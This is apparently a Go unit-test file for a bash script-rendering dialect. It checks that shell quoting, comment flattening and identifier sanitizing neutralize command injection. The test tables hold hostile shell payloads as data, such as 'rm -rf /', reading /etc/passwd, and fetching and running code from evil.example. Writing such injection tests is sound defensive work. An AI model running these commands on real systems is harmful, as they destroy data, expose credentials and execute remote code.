package flow

import (
	"strings"
	"testing"

	"github.com/badskater/encode-system/backend/internal/model"
)

// TestBashQuote wraps arbitrary strings in single quotes with the POSIX
// '\” escape for embedded single quotes. This is the core injection guard:
// once a value is inside '…' the shell treats it literally.
func TestBashQuote(t *testing.T) {
	d := BashDialect{}
	cases := []struct {
		in   string
		want string
	}{
		// plain values pass through wrapped
		{"hello", `'hello'`},
		{"simple value", `'simple value'`},
		{"/path/to/file", `'/path/to/file'`},
		// embedded single quote is escaped via the '\'' idiom.
		{"O'Brien", `'O'\''Brien'`},
		// single quote alone: ''\'''
		{"'", `''\'''`},
		// empty string still quotes (so it is not a bare token)
		{"", `''`},
	}
	for _, c := range cases {
		got := d.Quote(c.in)
		if got != c.want {
			t.Errorf("Quote(%q) = %q, want %q", c.in, got, c.want)
		}
	}
	// Multiple embedded single quotes: assert via the round-trip
	// property instead of hand-encoding the (fiddly) escaped form.
	for _, in := range []string{"''", "'''", "a'b'c"} {
		q := d.Quote(in)
		if len(q) < 2 || q[0] != '\'' || q[len(q)-1] != '\'' {
			t.Errorf("Quote(%q) = %q: must be single-quoted", in, q)
			continue
		}
		roundTrip := strings.ReplaceAll(q[1:len(q)-1], `'\''`, "'")
		if roundTrip != in {
			t.Errorf("Quote(%q) round-trip failed: got back %q", in, roundTrip)
		}
	}
}

// TestBashQuoteNeutralizesInjection: the whole point — hostile payloads
// must come out inert. After quoting, none may break out of the quote.
func TestBashQuoteNeutralizesInjection(t *testing.T) {
	hostile := []string{
		`'; rm -rf /'`,
		"`; cat /etc/passwd`",
		`$(curl http://evil.example/x | sh)`,
		`"$(reboot)"`,
		"some\nInvoke-EvilCmd\nmore",
		`foo; bar`,
		`foo && bar`,
		`foo | bar`,
		`> /etc/passwd`,
		`$(env)`,
		"${IFS}rm${IFS}-rf${IFS}/",
	}
	d := BashDialect{}
	for _, h := range hostile {
		q := d.Quote(h)
		if !strings.HasPrefix(q, "'") || !strings.HasSuffix(q, "'") {
			t.Errorf("Quote(%q) = %q: must be single-quoted", h, q)
		}
	}
}

// TestBashQuoteRoundTrip: a robust way to prove injection-safety — the
// escaped form, when unquoted by bash's single-quote rules (drop the
// surrounding quotes, turn '\” into a lone '), must equal the input.
// If any metacharacter survived unquoted, this round-trip breaks.
func TestBashQuoteRoundTrip(t *testing.T) {
	values := []string{
		`'; rm -rf /'`,
		"`; cat /etc/passwd`",
		`$(curl http://evil.example/x | sh)`,
		"line1\nline2",
		`weird " stuff `,
		`O'Brien`,
		"",
		"plain",
	}
	d := BashDialect{}
	for _, v := range values {
		q := d.Quote(v)
		if len(q) < 2 || q[0] != '\'' || q[len(q)-1] != '\'' {
			t.Errorf("Quote(%q) = %q: not wrapped in single quotes", v, q)
			continue
		}
		inner := q[1 : len(q)-1]
		roundTrip := strings.ReplaceAll(inner, `'\''`, "'")
		if roundTrip != v {
			t.Errorf("Quote round-trip failed for %q: got back %q", v, roundTrip)
		}
	}
}

// TestBashComment flattens newlines so a value interpolated into a
// comment can never terminate it. (The '#' leader is supplied by the
// renderer's format strings, mirroring psComment.)
func TestBashComment(t *testing.T) {
	d := BashDialect{}
	in := "nice\nInvoke-EvilCmd"
	got := d.Comment(in)
	if strings.Contains(got, "\n") {
		t.Errorf("Comment leaked a newline: %q", got)
	}
	// The newline-flattened content must be on a single line (no
	// executable smuggle possible once it's inside a comment).
	if strings.Contains(got, "Invoke-EvilCmd") && strings.Contains(got, "\n") {
		t.Errorf("Comment did not flatten: %q", got)
	}
}

// TestBashSafeIdent strips to [a-z0-9_] (defense in depth for keys/types
// interpolated as bare tokens).
func TestBashSafeIdent(t *testing.T) {
	cases := map[string]string{
		"source_rename": "source_rename",
		"audio":         "audio",
		"UPPER":         "upper",
		// hyphens are NOT in [a-z0-9_], so they are dropped.
		`x"; rm -rf /;`: "xrmrf",
		"":              "",
	}
	d := BashDialect{}
	for in, want := range cases {
		got := d.SafeIdent(in)
		if got != want {
			t.Errorf("SafeIdent(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestBashExtAndPreamble: the dialect emits .sh and the bash preamble
// (shebang + set -euo pipefail + generated-by comment).
func TestBashExtAndPreamble(t *testing.T) {
	d := BashDialect{}
	if d.Ext() != ".sh" {
		t.Errorf("Ext = %q, want .sh", d.Ext())
	}
	h := d.Preamble(testJob(), &model.Flow{Name: "x"}, testVars())
	if !strings.HasPrefix(h, "#!/usr/bin/env bash") {
		t.Errorf("Preamble missing shebang: %q", h)
	}
	if !strings.Contains(h, "set -euo pipefail") {
		t.Errorf("Preamble missing set -euo pipefail: %q", h)
	}
}

// TestBashStepCallMarkerText: StepCall must emit the ENCODE_STEP start
// and ENCODE_STEP_FAILED markers with the same text the PS dialect emits
// (the agent parses these from stdout).
func TestBashStepCallMarkerText(t *testing.T) {
	d := BashDialect{}
	tpl := &model.StepTemplate{Key: "noop", PowerShell: "function Invoke-Noop {\n    param($Job,$Params)\n    Write-Output \"ENCODE_STEP noop 0\"\n}"}
	st := model.Step{Type: "noop"}
	block, err := d.StepCall(0, tpl, st, "noop", "invoke_noop")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(block, "ENCODE_STEP noop start") {
		t.Errorf("StepCall missing start marker: %q", block)
	}
	if !strings.Contains(block, "ENCODE_STEP_FAILED noop") {
		t.Errorf("StepCall missing failure marker: %q", block)
	}
}

// TestBashJobDone emits the terminal marker (same text as PS).
func TestBashJobDone(t *testing.T) {
	got := BashDialect{}.JobDone()
	if !strings.Contains(got, "ENCODE_JOB_DONE") {
		t.Errorf("JobDone = %q, missing marker", got)
	}
}
